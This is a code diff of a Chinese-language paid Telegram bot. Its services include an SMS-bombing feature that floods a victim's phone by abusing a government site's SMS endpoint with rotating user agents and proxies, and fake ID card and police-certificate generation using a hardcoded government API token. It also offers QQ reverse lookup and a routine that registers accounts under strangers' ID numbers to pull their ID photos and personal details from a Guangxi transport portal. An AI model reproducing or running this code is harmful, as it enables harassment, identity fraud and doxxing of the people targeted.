@@ -3,7 +3,22 @@
 import sys
 print("===== Bot 精简稳定版（新增 /sms 刷短信，计费每条约0.99积分）=====")
 
-import os, time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64, itertools
+import os, subprocess
+
+# ===== 自动安装依赖（如果 requirements.txt 存在） =====
+REQ_FILE = "requirements.txt"
+if os.path.exists(REQ_FILE):
+    print("📦 正在自动安装 requirements.txt 中的依赖...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", REQ_FILE])
+        print("✅ 依赖安装完成")
+    except Exception as e:
+        print(f"⚠️ 自动安装失败: {e}")
+else:
+    print("ℹ️ 未找到 requirements.txt，跳过自动安装")
+
+# ===== 导入所有第三方库 =====
+import time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64, itertools
 from datetime import datetime
 from pathlib import Path
 from PIL import Image, ImageDraw, ImageFont
@@ -37,9 +52,9 @@ PORT = 8080
 POINTS_RATE = 1
 CHECK_INTERVAL = 0.5
 ORDER_TIMEOUT = 1800
-ADMIN_IDS = [6040143940]  # 你的管理员ID
+ADMIN_IDS = [6040143940]
 
-# ===== JSON存储（带备份恢复） =====
+# ===== JSON存储 =====
 USERS_FILE = "users.json"
 USERS_BACKUP = "users.json.bak"
 
@@ -62,7 +77,6 @@ def load_users():
         except (FileNotFoundError, json.JSONDecodeError):
             users = {}
             print("⚠️ 未找到有效用户数据，创建新文件")
-
 load_users()
 
 def save_users():
@@ -89,7 +103,7 @@ def get_font(font_path, size):
         _FONT_CACHE[key] = ImageFont.truetype(font_path, size)
     return _FONT_CACHE[key]
 
-# ===== 身份证生成函数（完整） =====
+# ===== 身份证生成 =====
 HEADERS1 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","zwfw-token":ZWFW_TOKEN,"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","content-type":"application/json","sec-ch-ua-mobile":"?1","Accept":"*/*","Origin":"https://zwfw.dn.haikou.gov.cn","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 HEADERS2 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","sec-ch-ua-mobile":"?1","Accept":"*/*","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 def query_id_card_sync(id_card):
@@ -204,7 +218,7 @@ def generate_plc_sync(name,id_card,address,avatar_path):
     c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
     return img_bytes,pdf_bytes
 
-# ===== q反功能（QQ反查）=====
+# ===== q反 =====
 def decrypt_text(encrypted):
     return base64.b64decode(encrypted).decode()
 
@@ -335,16 +349,40 @@ def callback():
 
 def run_flask(): flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
 
-# ===== Telegram 命令 =====
+# ===== Telegram 命令状态常量 =====
 RECHARGE_AMOUNT = 1
 QF_QQ = 100
-# 已删除 BQ_* 状态
-YS_NAME, YS_ID = range(200, 202)                 # /2ys 对话状态
-SMS_CHOICE = 300                                 # /sms 选择条数
-
-# ===== 新增 /gxlys 状态 =====
+YS_NAME, YS_ID = range(200, 202)
+SMS_CHOICE = 300
 GX_NAME, GX_ID, GX_PHONE, GX_CAPTCHA, GX_SMS = range(400, 405)
 
+# ===== 代理池功能 =====
+def test_proxy(proxy):
+    try:
+        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+        r = requests.get('https://www.baidu.com', proxies=proxies, timeout=5)
+        return r.status_code == 200
+    except:
+        return False
+
+def load_working_proxy(proxy_file='proxy_list.txt'):
+    if not os.path.exists(proxy_file):
+        logger.warning(f"代理文件 {proxy_file} 不存在，将直连")
+        return None
+    with open(proxy_file, 'r') as f:
+        proxies = [line.strip() for line in f if line.strip()]
+    if not proxies:
+        logger.warning("代理文件为空，将直连")
+        return None
+    logger.info(f"开始测试 {len(proxies)} 个代理...")
+    for p in proxies:
+        if test_proxy(p):
+            logger.info(f"✅ 找到可用代理: {p}")
+            return p
+    logger.warning("❌ 没有可用代理，将直连")
+    return None
+
+# ===== 基本命令 =====
 def start(update, context):
     context.user_data.clear()
     uid=update.effective_user.id; ensure_user(uid); stats=get_user_stats(uid)
@@ -389,7 +427,6 @@ def cancel(update, context):
     update.message.reply_text("已取消")
     return ConversationHandler.END
 
-# ----- okcz 对话 -----
 def okcz_start(update, context):
     context.user_data.clear()
     uid=update.effective_user.id
@@ -399,12 +436,10 @@ def okcz_start(update, context):
     return RECHARGE_AMOUNT
 
 def okcz_amount(update, context):
-    # 检测是否为命令（以/开头），若是则取消并结束
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
-
     try:
         amt=float(re.sub(r'[^\d.]','',update.message.text))
     except:
@@ -427,7 +462,6 @@ def okcz_amount(update, context):
     update.message.reply_text(f"✅ 订单已创建\n订单号: {order_id}\n金额: {amt:.2f} USDT → {points:.2f} 积分\n点击按钮支付", reply_markup=InlineKeyboardMarkup(keyboard))
     return ConversationHandler.END
 
-# ----- 其他简单命令 -----
 def cx(update, context):
     context.user_data.clear()
     stats=get_user_stats(update.effective_user.id)
@@ -519,7 +553,7 @@ def sfz_start(update,context):
 def sfz_name(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     context.user_data['name']=update.message.text.strip()
     update.message.reply_text("请输入18位身份证号：")
@@ -528,7 +562,7 @@ def sfz_name(update,context):
 def sfz_id(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     id_card=update.message.text.strip().upper()
     if len(id_card)!=18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
@@ -541,7 +575,7 @@ def sfz_id(update,context):
 def sfz_nation(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     context.user_data['nation']=update.message.text.strip()
     update.message.reply_text("请输入地址：")
@@ -550,7 +584,7 @@ def sfz_nation(update,context):
 def sfz_address(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     context.user_data['address']=update.message.text.strip()
     update.message.reply_text("请输入有效期（如 2020.01.01-2030.01.01）：")
@@ -559,7 +593,7 @@ def sfz_address(update,context):
 def sfz_expiry(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     context.user_data['expiry']=update.message.text.strip()
     update.message.reply_text("请发送本人照片：")
@@ -568,7 +602,7 @@ def sfz_expiry(update,context):
 def sfz_photo(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     if not update.message.photo:
         update.message.reply_text("请发送图片")
@@ -605,7 +639,7 @@ def plc_start(update,context):
 def plc_name(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     context.user_data['name']=update.message.text.strip()
     update.message.reply_text("请输入18位身份证号：")
@@ -614,7 +648,7 @@ def plc_name(update,context):
 def plc_id(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     id_card=update.message.text.strip().upper()
     if len(id_card)!=18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
@@ -650,7 +684,7 @@ def plc_addr_confirm_callback(update,context):
 def plc_addr_manual(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     addr=update.message.text.strip()
     if not addr:
@@ -663,7 +697,7 @@ def plc_addr_manual(update,context):
 def plc_photo(update,context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     if not update.message.photo:
         update.message.reply_text("请发送图片")
@@ -692,7 +726,7 @@ def plc_photo(update,context):
         context.user_data.clear()
     return ConversationHandler.END
 
-# ===== q反 对话 =====
+# ===== qf =====
 def qf_start(update, context):
     context.user_data.clear()
     update.message.reply_text("请输入要查询的QQ号：")
@@ -701,7 +735,7 @@ def qf_start(update, context):
 def qf_qq(update, context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     if not update.message.text:
         update.message.reply_text("请发送文本消息")
@@ -720,7 +754,7 @@ def qf_qq(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
-# ===== /2ys 身份验证（消耗0.05积分） =====
+# ===== /2ys =====
 def ys_start(update, context):
     context.user_data.clear()
     update.message.reply_text("请输入姓名：")
@@ -729,7 +763,7 @@ def ys_start(update, context):
 def ys_name(update, context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     name = update.message.text.strip()
     if not name:
@@ -742,13 +776,12 @@ def ys_name(update, context):
 def ys_id(update, context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
-        update.message.reply_text("⏹️ 已取消当前操作，请重新发送命令")
+        update.message.reply_text("⏹️ 已取消")
         return ConversationHandler.END
     id_card = update.message.text.strip().upper()
     if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
-        update.message.reply_text("身份证号格式错误（须为18位数字或末位X），请重新输入：")
+        update.message.reply_text("身份证号格式错误，请重新输入：")
         return YS_ID
-
     uid = update.effective_user.id
     ensure_user(uid)
     stats = get_user_stats(uid)
@@ -757,17 +790,14 @@ def ys_id(update, context):
         update.message.reply_text(f"❌ 积分不足，需要 {cost} 积分，当前 {stats['points']:.2f}")
         context.user_data.clear()
         return ConversationHandler.END
-
     users[str(uid)]['points'] = stats['points'] - cost
     save_users()
     update.message.reply_text(f"⏳ 正在校验（已扣除 {cost} 积分），请稍候...")
-
     name = context.user_data.get('ys_name')
     if not name:
         update.message.reply_text("姓名丢失，请重新 /2ys")
         context.user_data.clear()
         return ConversationHandler.END
-
     try:
         url = "https://www.bequicker.cn/apih5/product/applyCredit"
         headers = {
@@ -807,29 +837,24 @@ def ys_id(update, context):
             update.message.reply_text(f"服务器返回：\n{resp.text}")
     except Exception as e:
         update.message.reply_text(f"❌ 请求出错：{e}")
-
     context.user_data.clear()
     return ConversationHandler.END
 
-# ===== /sms 刷短信功能（支持代理，每条约0.99积分） =====
+# ===== /sms =====
 def do_sms_attack(chat_id, bot, target_count, phone, user_id):
     import random
     token_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/jxpWvCharService/getWvCharToken"
     sms_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/mobile/user/sendMessage"
-    
-    # 代理支持（从环境变量读取）
     proxies = {}
     if os.environ.get('HTTP_PROXY'):
         proxies['http'] = os.environ.get('HTTP_PROXY')
     if os.environ.get('HTTPS_PROXY'):
         proxies['https'] = os.environ.get('HTTPS_PROXY')
-    
     ua_list = [
         "Mozilla/5.0 (Linux; Android 14; RMX3920 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380353 MMWEBSDK/20240405 MMWEBID/8255 MicroMessenger/Lite Luggage/4.2.7 QQ/9.3.10.37675 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
         "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.180 Mobile Safari/537.36",
     ]
-    
     session = requests.Session()
     session.headers.update({
         "Accept": "*/*",
@@ -843,13 +868,8 @@ def do_sms_attack(chat_id, bot, target_count, phone, user_id):
         "User-Agent": random.choice(ua_list),
         "X-Requested-With": "XMLHttpRequest",
     })
-    
     token_payload = {"appkey": "TPBidder"}
-    count = 0
-    success_count = 0
-    fail_count = 0
-    error_reported = False
-
+    count = 0; success_count = 0; fail_count = 0; error_reported = False
     try:
         while count < target_count:
             count += 1
@@ -859,24 +879,19 @@ def do_sms_attack(chat_id, bot, target_count, phone, user_id):
                 if token_res.status_code != 200:
                     fail_count += 1
                     if not error_reported and count <= 3:
-                        bot.send_message(chat_id, f"❌ Token获取失败，状态码{token_res.status_code}，响应：{token_res.text[:200]}")
+                        bot.send_message(chat_id, f"❌ Token获取失败，状态码{token_res.status_code}")
                         error_reported = True
-                    time.sleep(1)
-                    continue
-                    
+                    time.sleep(1); continue
                 data = token_res.json()
                 if "custom" not in data or "token" not in data["custom"]:
                     fail_count += 1
                     if not error_reported and count <= 3:
-                        bot.send_message(chat_id, f"❌ Token响应格式异常：{data}")
+                        bot.send_message(chat_id, f"❌ Token响应格式异常")
                         error_reported = True
-                    time.sleep(1)
-                    continue
-                    
+                    time.sleep(1); continue
                 token = data["custom"]["token"]
                 sms_payload = {"token": token, "params": {"mobilephone": phone}}
                 sms_res = session.post(sms_url, json=sms_payload, timeout=5, verify=False, proxies=proxies)
-                
                 if sms_res.status_code == 200:
                     sms_json = sms_res.json()
                     if sms_json.get('code') == 0:
@@ -884,35 +899,22 @@ def do_sms_attack(chat_id, bot, target_count, phone, user_id):
                     else:
                         fail_count += 1
                         if not error_reported and count <= 3:
-                            bot.send_message(chat_id, f"❌ 短信失败：code={sms_json.get('code')}, msg={sms_json.get('message','')}\n响应：{sms_res.text[:200]}")
+                            bot.send_message(chat_id, f"❌ 短信失败：code={sms_json.get('code')}")
                             error_reported = True
                 else:
                     fail_count += 1
                     if not error_reported and count <= 3:
-                        bot.send_message(chat_id, f"❌ 短信接口HTTP {sms_res.status_code}：{sms_res.text[:200]}")
+                        bot.send_message(chat_id, f"❌ 短信接口HTTP {sms_res.status_code}")
                         error_reported = True
-                        
-            except requests.exceptions.ConnectionError as ce:
-                fail_count += 1
-                if not error_reported and count <= 3:
-                    bot.send_message(chat_id, f"❌ 网络连接失败（无法访问目标服务器）\n可能是服务器IP被限制或DNS解析失败。\n建议：\n1. 检查服务器网络设置\n2. 设置代理（环境变量 HTTP_PROXY / HTTPS_PROXY）\n3. 更换运行环境（如使用有访问权限的VPS）\n错误详情：{ce}")
-                    error_reported = True
-                time.sleep(2)
-                continue
             except Exception as e:
                 fail_count += 1
                 if not error_reported and count <= 3:
-                    bot.send_message(chat_id, f"❌ 第{count}次异常：{e}")
+                    bot.send_message(chat_id, f"❌ 异常：{e}")
                     error_reported = True
-                time.sleep(1)
-                continue
-                    
+                time.sleep(1); continue
             time.sleep(1.0)
-            
             if count % 10 == 0 or count == target_count:
-                progress = (count / target_count) * 100
-                bot.send_message(chat_id, f"📤 进度：{count}/{target_count} ({progress:.1f}%) 成功{success_count}条 失败{fail_count}条")
-                
+                bot.send_message(chat_id, f"📤 进度：{count}/{target_count} 成功{success_count} 失败{fail_count}")
         bot.send_message(chat_id, f"✅ 刷短信完成！成功{success_count}条，失败{fail_count}条。")
     except Exception as e:
         bot.send_message(chat_id, f"❌ 刷短信过程中出错：{e}")
@@ -938,16 +940,13 @@ def sms_choice_callback(update, context):
     if not data.startswith("sms_"):
         return
     count = int(data.split("_")[1])
-    # 新计费规则：每条0.99积分
     cost = round(count * 0.99, 2)
-
     user_id = query.from_user.id
     ensure_user(user_id)
     stats = get_user_stats(user_id)
     if stats['points'] < cost:
-        query.edit_message_text(f"❌ 积分不足，需要 {cost:.2f} 积分，当前 {stats['points']:.2f} 积分。请先充值或签到。")
+        query.edit_message_text(f"❌ 积分不足，需要 {cost:.2f} 积分，当前 {stats['points']:.2f}")
         return ConversationHandler.END
-
     users[str(user_id)]['points'] = stats['points'] - cost
     save_users()
     query.edit_message_text(f"✅ 已扣除 {cost:.2f} 积分，剩余 {users[str(user_id)]['points']:.2f} 积分。\n请输入手机号（11位）：")
@@ -981,8 +980,7 @@ def sms_cancel(update, context):
     update.message.reply_text("已取消刷短信")
     return ConversationHandler.END
 
-# ===== /gxlys 广西道路运输查询/注册（新增） =====
-# ---- SM4加密（复制自原脚本） ----
+# ===== /gxlys 广西道路运输 =====
 SM4_KEY = "CatsPK0WWWRRhjkw"
 SboxTable = [
     0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
@@ -1013,34 +1011,27 @@ CK = [
     0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
     0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
 ]
-
 def rotl(x, n):
     left = (x << n) & 0xffffffff
     signed_x = x - 0x100000000 if (x & 0x80000000) else x
     right = (signed_x >> (32 - n)) & 0xffffffff
     return left | right
-
 def sm4_sbox(a):
     return (SboxTable[(a >> 24) & 0xFF] << 24) | \
            (SboxTable[(a >> 16) & 0xFF] << 16) | \
            (SboxTable[(a >> 8) & 0xFF] << 8) | \
            SboxTable[a & 0xFF]
-
 def sm4_lt(ka):
     bb = sm4_sbox(ka)
     return bb ^ rotl(bb, 2) ^ rotl(bb, 10) ^ rotl(bb, 18) ^ rotl(bb, 24)
-
 def sm4_calci_rk(ka):
     bb = sm4_sbox(ka)
     return bb ^ rotl(bb, 13) ^ rotl(bb, 23)
-
 def sm4_f(x0, x1, x2, x3, rk):
     return x0 ^ sm4_lt(x1 ^ x2 ^ x3 ^ rk)
-
 def pkcs7_pad(data: bytes, block_size=16) -> bytes:
     pad_len = block_size - (len(data) % block_size)
     return data + bytes([pad_len]) * pad_len
-
 def sm4_encrypt_ecb(plain_text: str) -> str:
     data = plain_text.encode('utf-8')
     padded = pkcs7_pad(data, 16)
@@ -1073,7 +1064,6 @@ def sm4_encrypt_ecb(plain_text: str) -> str:
         result.extend(out)
     return base64.b64encode(result).decode('utf-8')
 
-# ---- 广西接口相关函数 ----
 GX_BASE_URL = "http://www.gxdlys.com"
 GX_PASSWORD = "268428."
 GX_HEADERS = {
@@ -1085,9 +1075,7 @@ GX_HEADERS = {
     "Connection": "keep-alive",
     "Referer": "http://www.gxdlys.com/Wechat/User/Regist",
 }
-
 def gx_get_captcha(session):
-    """获取图形验证码，返回 (img_b64, uuid)"""
     try:
         url = GX_BASE_URL + "/Wechat/FaceDetect/GetVerifyCode"
         resp = session.get(url, headers=GX_HEADERS, timeout=10)
@@ -1104,9 +1092,7 @@ def gx_get_captcha(session):
     except Exception as e:
         logger.error(f"获取图形验证码异常: {e}")
         return None, None
-
 def gx_send_sms(session, phone, captcha_code, uuid):
-    """发送短信验证码"""
     data = {
         "phoneId": phone,
         "type": "10001",
@@ -1115,25 +1101,17 @@ def gx_send_sms(session, phone, captcha_code, uuid):
         "uuid": uuid
     }
     try:
-        r = session.post(
-            GX_BASE_URL + "/System/SmsService/PostVerifyCode",
-            data=data,
-            headers={
-                **GX_HEADERS,
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
-            },
-            timeout=60
-        )
+        r = session.post(GX_BASE_URL + "/System/SmsService/PostVerifyCode",
+                         data=data,
+                         headers={**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/User/Regist"},
+                         timeout=60)
         if r.status_code == 200:
             res = r.json()
             return res.get("statusCode") == 200, res.get("info", "未知错误")
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, str(e)
-
 def gx_register(session, phone, sms_code, captcha_code, real_name, id_card):
-    """注册"""
     data = {
         "zipArea": "",
         "userType": "-1",
@@ -1153,43 +1131,25 @@ def gx_register(session, phone, sms_code, captcha_code, real_name, id_card):
         "verifyCode": captcha_code
     }
     try:
-        r = session.post(
-            GX_BASE_URL + "/Wechat/User/RegistAdd",
-            data=data,
-            headers={
-                **GX_HEADERS,
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
-            },
-            timeout=60
-        )
+        r = session.post(GX_BASE_URL + "/Wechat/User/RegistAdd",
+                         data=data,
+                         headers={**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/User/Regist"},
+                         timeout=60)
         if r.status_code == 200:
             res = r.json()
             return res.get("statusCode") == 200, res.get("info", "未知错误")
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, str(e)
-
 def gx_login(session, id_card, password):
-    """登录，返回成功/失败及信息"""
     encrypted_login_raw = sm4_encrypt_ecb(id_card)
     encrypted_pwd_raw = sm4_encrypt_ecb(password)
     encrypted_login = urllib.parse.quote(encrypted_login_raw)
     encrypted_pwd = urllib.parse.quote(encrypted_pwd_raw)
     data = f"loginName={encrypted_login}&password={encrypted_pwd}&wechatUid="
-    login_headers = {
-        **GX_HEADERS,
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Referer": "http://www.gxdlys.com/Wechat/Home/Login",
-        "Host": "www.gxdlys.com"
-    }
+    login_headers = {**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/Home/Login", "Host": "www.gxdlys.com"}
     try:
-        response = session.post(
-            "http://www.gxdlys.com/Wechat/Home/PostLogin",
-            headers=login_headers,
-            data=data,
-            timeout=60
-        )
+        response = session.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=login_headers, data=data, timeout=60)
         if response.status_code == 200:
             res = response.json()
             status = res.get("statusCode")
@@ -1201,17 +1161,11 @@ def gx_login(session, id_card, password):
         return False, f"HTTP {response.status_code}"
     except Exception as e:
         return False, str(e)
-
 def gx_query_photo(session, name, id_card):
-    """查询身份证照片信息，返回 (是否成功, 数据字典或错误信息)"""
     try:
         encoded_name = urllib.parse.quote(name)
         url = f"{GX_BASE_URL}/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={encoded_name}"
-        query_headers = {
-            **GX_HEADERS,
-            "Referer": "http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1",
-            "Host": "www.gxdlys.com"
-        }
+        query_headers = {**GX_HEADERS, "Referer": "http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1", "Host": "www.gxdlys.com"}
         response = session.get(url, headers=query_headers, timeout=60)
         if response.status_code != 200:
             return False, f"HTTP {response.status_code}"
@@ -1222,9 +1176,7 @@ def gx_query_photo(session, name, id_card):
             return False, result.get("info", "未知错误")
     except Exception as e:
         return False, str(e)
-
 def gx_download_photo(session, file_id):
-    """下载照片，返回 bytes 或 None"""
     try:
         url = f"{GX_BASE_URL}/System/FileService/ShowFile?fileId={file_id}"
         response = session.get(url, timeout=60)
@@ -1234,9 +1186,7 @@ def gx_download_photo(session, file_id):
     except Exception as e:
         logger.error(f"下载照片异常: {e}")
         return None
-
 def gx_format_info(item2):
-    """格式化身份信息"""
     xm = item2.get("xm", "").strip()
     sfz = item2.get("gmsfhm", "").strip()
     mz = item2.get("mz", "").replace("族", "").strip()
@@ -1246,12 +1196,10 @@ def gx_format_info(item2):
     yxqz = item2.get("uL_END_DATE", "").replace("-", ".")
     return f"姓名：{xm}\n身份证：{sfz}\n民族：{mz}\n有效期：{yxqq} 至 {yxqz}\n签发机关：{qfjg}\n地址：{zz}"
 
-# ---- Telegram 对话处理 ----
 def gx_start(update, context):
     context.user_data.clear()
     update.message.reply_text("请输入姓名：")
     return GX_NAME
-
 def gx_name(update, context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
@@ -1264,7 +1212,6 @@ def gx_name(update, context):
     context.user_data['gx_name'] = name
     update.message.reply_text("请输入18位身份证号：")
     return GX_ID
-
 def gx_id(update, context):
     if update.message.text and update.message.text.startswith('/'):
         context.user_data.clear()
@@ -1275,23 +1222,24 @@ def gx_id(update, context):
         update.message.reply_text("格式错误，请重新输入：")
         return GX_ID
     context.user_data['gx_id'] = id_card
-    # 创建 session
+    working_proxy = load_working_proxy()
     session = requests.Session()
+    if working_proxy:
+        session.proxies = {'http': f'http://{working_proxy}', 'https': f'http://{working_proxy}'}
+        logger.info(f"使用代理: {working_proxy}")
+    else:
+        logger.warning("未找到可用代理，将直连")
     session.get(GX_BASE_URL, headers=GX_HEADERS, timeout=10)
     context.user_data['gx_session'] = session
-
-    # 尝试直接登录
     update.message.reply_text("⏳ 正在检查账号状态...")
     ok, msg = gx_login(session, id_card, GX_PASSWORD)
     if ok:
-        # 登录成功，直接查询
         update.message.reply_text("✅ 登录成功，正在获取信息...")
         success, data = gx_query_photo(session, context.user_data['gx_name'], id_card)
         if success:
             item2 = data.get("item2", {})
             if item2:
-                info_text = gx_format_info(item2)
-                update.message.reply_text(info_text)
+                update.message.reply_text(gx_format_info(item2))
             else:
                 update.message.reply_text("⚠️ 未获取到身份文字信息")
             file_id = data.get("item1")
@@ -1306,7 +1254,6 @@ def gx_id(update, context):
         context.user_data.clear()
         return ConversationHandler.END
     else:
-        # 登录失败，判断是否未注册
         if "未注册" in msg or "不存在" in msg:
             update.message.reply_text(f"⚠️ 检测到未注册：{msg}\n请输入手机号（用于注册）：")
             return GX_PHONE
@@ -1325,8 +1272,6 @@ def gx_phone(update, context):
         update.message.reply_text("手机号必须是11位数字，请重新输入：")
         return GX_PHONE
     context.user_data['gx_phone'] = phone
-
-    # 获取图形验证码
     update.message.reply_text("⏳ 正在获取验证码图片...")
     session = context.user_data['gx_session']
     img_b64, uuid = gx_get_captcha(session)
@@ -1335,7 +1280,6 @@ def gx_phone(update, context):
         context.user_data.clear()
         return ConversationHandler.END
     context.user_data['gx_uuid'] = uuid
-    # 发送图片
     try:
         img_bytes = base64.b64decode(img_b64)
         update.message.reply_photo(photo=io.BytesIO(img_bytes), caption="请查看上方验证码并输入（不区分大小写）")
@@ -1356,8 +1300,6 @@ def gx_captcha(update, context):
         update.message.reply_text("验证码不能为空，请重新输入：")
         return GX_CAPTCHA
     context.user_data['gx_captcha'] = captcha
-
-    # 发送短信
     phone = context.user_data['gx_phone']
     uuid = context.user_data['gx_uuid']
     session = context.user_data['gx_session']
@@ -1379,35 +1321,28 @@ def gx_sms(update, context):
     if not sms_code.isdigit() or len(sms_code) != 6:
         update.message.reply_text("验证码必须是6位数字，请重新输入：")
         return GX_SMS
-
-    # 注册
     name = context.user_data['gx_name']
     id_card = context.user_data['gx_id']
